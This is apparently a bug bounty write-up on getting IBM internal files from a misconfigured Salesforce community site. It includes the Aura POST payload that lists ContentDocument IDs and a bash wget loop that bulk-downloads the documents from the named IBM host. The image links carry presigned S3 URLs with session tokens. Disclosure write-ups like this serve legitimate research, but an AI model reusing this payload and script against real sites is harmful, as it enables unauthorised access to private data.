---
title: "How I was able to access IBM internal documents"
classes: wide
header:
  teaser: /assets/images/crackmes1/ibm.jpg
ribbon: DodgerBlue
categories:
  - bugbounty
toc: true
---

Hi, today I will share how I was able to access internal data of https://weathercommunity.ibm.com using salesforce misconfiguration.

This write-up will depends n this great blog: https://web.archive.org/web/20210125200757/https://www.enumerated.de/salesforce
so please read it first then read this write-up.

After I read this blog, I wanted to exploit it in the wild so I now I wanted to see the subdomains which point to on of the following CNAMEs:

*.force.com

*.secure.force.com

*live.siteforce.com

I used this great tool https://github.com/yghonem14/cngo to get CNMAEs of all the websites that have program 
on hackerone through https://chaos.projectdiscovery.io/

I found this subdomain **weathercommunity.ibm.com** which pointing out to: **thercommunity.ibm.com.00de0000000avgcma2.live.siteforce.com**

I found an endpoint like:
     
![](https://images.squarespace-cdn.com/content/v1/5f7770a896185c777e49b396/1602179691337-ZXQYGZ11DJ60P6T3RURB/ke17ZwdGBToddI8pDm48kD6aNKZxB3DN5p6JsVrwzw1Zw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZcY1lis3u7ujHaqKviAjfgBXb2P7ACMlJX44aBDLb--xfEjN8oatzV-2psMy5gKWM4rq4TCJTzAyL25jm0DX3aYLdXwLHXSvXM5NA8ifPwj1/aura_query.PNG?format=2500w)

then I sent this POST request to the Repeater and changed the ***Message*** parameter to:
```
{"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"MARKER","layoutType":"FULL","pageSize":100,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}

```
Replacing the ***MARKER*** string with:

***ContentDocument***

![](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/yhbkptntl3ejirmp120m63bww7qp?response-content-disposition=attachment%3B%20filename%3D%22sscx.png%22%3B%20filename%2A%3DUTF-8%27%27sscx.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVWUV5OPW%2F20220304%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220304T203539Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEPr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCKkKDd%2FYAGDreUjy2PkCVyL4WkLDfQdTTWK%2FQQ%2BXV9dgIhAP4SLBQum5dkwla7qA0bALGXc3YLMn3%2FN5%2B4k4%2FnFNb%2BKvoDCGMQAhoMMDEzNjE5Mjc0ODQ5IgxVuaWbVMzYX%2FFfL7Iq1wMPdnxlUWbOCNct9xMVEH9uFip3Cq%2FZUlXK4B77TUcv5jwABvySCfeeihj1EhLuYl5%2FHWIFvcFJmz2I3KxTEhQ0%2FSdmpvmPDMJuX%2BJ7VBRTX90TG2LOtqeQo6Ahjw4qwMm2UwxvqRv0H%2BfcyBSaI8R7kCZSy4van5BLEcx0nDb%2BnvzekJTklkAOAck4EWN45ZhghIMEJz3W2gdnaSdGKKUekX30a6Mzn7%2BZyrAmEXLKNWqWrCHmr5z%2FAAHihOuqRXSJZaVO6vjW3Tnc1WxmBU4686gtnww41do6IWnHeHDpnMGqHU0zzmi3MU7wQlQH12TYux8s9Vo%2FX%2BANL4LlZbaaYjiSTzZN7S9Mv4MLkygTp4akIT1IXnSE0Njao8utUIT0hieUBCVGKw%2BpaOMJAkMIHQ%2BVToZNO13kP5gdy46BUoqJzqx2XykjU2gLpt2ScOnfCywoYyQxYkX%2FW4ndpHh5UThQaI47ySTKz79L8zg3%2B03WBxUKzzIynXiwfNsq1MY7wPJUrAdD4jDvwnvbwIrCtjJPLDTd4wu2GKNmep15vWBADnE21Rl%2FPgnGbdEQdWN%2FAcM5w3fskXZlwOTA%2F9FqYKvunPLzApawYmt3p%2FyRWZMVdC%2FRF2cw%2FKWJkQY6pAFllJRyfbRP6sIt%2BHrwTfQdejbA4WjdSyNC4Jsi9xsQS4EdtGOBD%2FzZ%2B3CEkgTXlHuCE5v0mQG9EcagoiB9viBTO7MF%2Bo4%2FPo7CEPfokbbjM2BNv2GoQt7WxPpGgVKojb76omwz7VVH1bx0ia2VId2Y7JZw3%2Bhh6OH2%2BqzokDzfJpDSAstF%2FTiA6zHYS1svfGO1yZIV9seNB0XtBjkFPBKo%2BcjGmg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ff19e6685aa66f4735dcd739fd13b496c5b21cf58a5f37667d26f4a4a11126d6)

See that there are more than 900 ID.
I extracted the ID value which started with 069 and made a simple bash script to download them one by one
through this endpoint /sfc/servlet.shepherd/document/download/$ID

https://weathercommunity.ibm.com/sfc/servlet.shepherd/document/download/ID

Example: 

https://weathercommunity.ibm.com/sfc/servlet.shepherd/document/download/0690h0000060wuHAAQ

```
while read i
do wget --no-check-certificate "https://weathercommunity.ibm.com/sfc/servlet.shepherd/document/download/$i"
done < $1

```

Sample of the internal images:

![](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9p4dbjafg8rtktxubh37ohuyc14s?response-content-disposition=attachment%3B%20filename%3D%220690h000007Aly3AAC%22%3B%20filename%2A%3DUTF-8%27%270690h000007Aly3AAC&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZYNIBA6H%2F20220304%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220304T204708Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEPr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD37f9Upttrr7X0u6Lv9S58bOu6vWvhE5W9%2BqsSiAPkjQIhAKfSpjXF99Cv13J7IfRx2KBI3dOZ%2Bcw5BHX1tw9wq07%2FKvoDCGMQAhoMMDEzNjE5Mjc0ODQ5IgzJyEflzTkp01Ectdsq1wMY9x4YZa6ek3mI86HYnVRSL%2FG%2Bt1kJ%2BewpNkdxHW%2FCc4xWoQnS5n3Er0OEcodDpvldfFFDnlnww5yhAlcX1pUK8bfILR7b6XI3sr3WN16aNzzb5lOLSsoaMfYA2JGyRm9joy3TbXtQozCzmNT%2FNZ03iKBDc%2F5qxAKRa%2BAeLAGSyGeBbXitaOZ53QsWi3HWs7jKfSasgR%2F7N%2FpxdMsOn%2B02ufYcmakGBKwnzVqF2eaQtja75sd4I6aX3XxRaO4xdv4ESEMW6gWy2%2BWnT4p0dB3WdbKqzsImFJw5gLbpa9bPeyK0L2gLRdAjjhO%2FPUtx8fJ%2BekmnqFkXejWbrh5msiRvGL9KDITja4wurm5OvVwQo%2FwR16wNa0Dh7mcZiiDy2In2gPzHGDV4FxRW0NXY%2BcdhFLW9OMDVA%2Bd%2FsE2bcdKj3x9%2FlhMAz5Lgu%2BYnbQ8AWklSHBmP%2BUlsLDE%2Fk0NsTuzTwHSLHQ06zVGIM7V7TOZfjnaYbKUNF%2Bb1HCLJoxTYN3UqJC%2BWe8zE6Wi5gMFtFvAmc0oMr1jtfK3Un3dSLZGUxE9nx4A3RlLafBfxtiWCi2qa2rmVDrwIWvRctOx5bcFyNjzu1NAzZIx4ymQS3EqeZ1uKlp6y1t4w8KGJkQY6pAHsT0iIcDrjKOKLuVzwV%2BX%2BQZPYAAfyiSprxLAmJ6T8JhWjwc1VQtc7KEyFZKfq38antz5jzqT2sYLU3mku76D8AnCjurzoDRbRRbN4DxlQR3stAmWSam8w%2BKWmlCrgY10XCPxgmsAhhu7OsimMbMKcYdF%2BzmbC82gxo3we4RRkdHUMo1KMXR6wtHZaJ6ggJh5PA8ZcUqjCEO9gmTruotlPpHYHcA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c3f571905620666c9aac2c51b2aad54b409e3046da2614f705ed86c29e7e5fd2)

![](/assets/images/crackmes/crit.PNG)


***Final word:**
you will not understand anything if you did not read the blog first as he explained erything in it.
